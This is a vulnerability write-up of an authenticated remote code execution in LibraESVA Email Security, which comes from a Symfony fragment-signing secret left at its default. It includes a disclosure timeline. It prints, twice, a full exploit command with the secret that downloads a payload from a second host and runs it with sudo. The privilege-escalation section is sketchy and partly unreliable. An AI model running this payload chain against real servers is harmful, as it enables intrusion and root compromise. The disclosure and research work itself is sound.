---
title: LibraEsva's Email Security Authenticated root shell
excert: An underling bug in Symfony brings to an RCE in famous email security manager
tags:
 - CVE
 - LibraEsva
 - RCE
 - Shellcode
 - Web
 - Walkthrough
category:
 - research
toc: true
classes: single
---

> Under construction
{: .prompt-warning}

> TL;DR: Based upon Symfony framework, LibraESVA exposed the [FragmentListener][1] class with well-know secret, leading to an authenticated RCE and subsequent privileges escalation to root.
{: .prompt-info}

Let's dive in:

## LibraEsva

The company LibraESVA proposes different solution for managing email ecosystem. From Email Security program to Load Balancer solution.
Basically those products are suite for managing emails, ranging from user management to built-in security features like antivirus scan and phishing prevention mechanism.

## Symfony RCE

Thanks to the [excellent work by Ambionic Security][2] on the Symfony Framework, it was possible to focus my research on the __FragmentListener__ class.
Quoting from their blog,  
```
Essentially, when someone issues a request to /_fragment, this listener sets request attributes from given GET parameters. Since this allows to run arbitrary PHP code (more on this later), the request has to be signed using a HMAC value. This HMAC's secret cryptographic key is stored under a Symfony configuration value named secret.
```

Obviously we need to find this __secret__. Luckily this was a trivial task, as the Symphony's well documented docs gives instruction where to find this value.
The __secret__ is located within the __/xxx/yyy/zzz.conf__ file, unchanged from the default value.

## RCE

Using the previous mentioned technique, it was possible to remotely execute command on the machine. This was achieved using the [Ambionic's Symfony Exploit][3] found on their GitHub page.
Building the command as following:
```
./secret_fragment_exploit.py https://192.168.11.120/_fragment -i "https://192.168.11.120/_fragment" -s '36b1f1aadcc7602eeedcd83cc7d5510e9b2a9bd5' -m 1 -f shell_exec -p cmd:"cd /tmp/; wget -qO upgradescript --no-check-certificate https://192.168.11.124:8443/QE4aPZwlxtk; chmod 777 upgradescript; sudo ./upgradescript disown
``` 

## Privilage Escalation

Located in ```/tmp``` there is a SUID script file which is either writable and executable. 
The __/tmp/upgradescript__ 

The complete command to trigger the chain is:
```
./secret_fragment_exploit.py https://192.168.11.120/_fragment -i "https://192.168.11.120/_fragment" -s '36b1f1aadcc7602eeedcd83cc7d5510e9b2a9bd5' -m 1 -f shell_exec -p cmd:"cd /tmp/; wget -qO upgradescript --no-check-certificate https://192.168.11.124:8443/QE4aPZwlxtk; chmod 777 upgradescript; sudo ./upgradescript disown
```

## Final thoughts 

It is very important to run periodic vulnerability assessment and complete penetration testing on you own products, which seems that LibraEsva haven't done. When developing a product based upon a framework, it is important to keep in mind that the framework itself could not be secure, that could lower the security of the overall project.
Nonetheless, LibraEsva were very quick in triaging and fixing the bug.

## Disclosure Timeline
18-03-2021 LibraEsva's developers team informed about the vuln
07-04-2021 Fix released with product version 4.9.5
27-07-2021 Public release

---
[1]: https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
[2]: https://www.ambionics.io/blog/symfony-secret-fragment
[3]: https://github.com/ambionics/symfony-exploits



